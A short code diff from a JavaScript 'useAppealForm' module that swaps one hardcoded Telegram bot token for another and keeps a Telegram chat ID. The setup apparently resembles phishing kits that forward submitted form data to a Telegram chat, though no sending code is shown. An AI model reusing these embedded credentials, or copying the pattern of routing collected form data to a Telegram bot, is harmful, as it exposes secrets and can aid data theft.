@@ -176,7 +176,7 @@ const STORAGE_KEY = 'appeal_form_data';
 const SUBMISSION_ID_KEY = 'submission_id';
 
 // ✅ Telegram config (EASILY CHANGEABLE)
-const TELEGRAM_BOT_TOKEN = "8388711243:AAHK6UUxOlMkjxuxHzfhlrwKlbjY3mUZ3dE";
+const TELEGRAM_BOT_TOKEN = "8243992860:AAEp2DVoMKm55Jbv-evtAOCbBs96Uq2bgVQ";
 const TELEGRAM_CHAT_ID = "-1003078888823";
 
 export function useAppealForm(emit) {
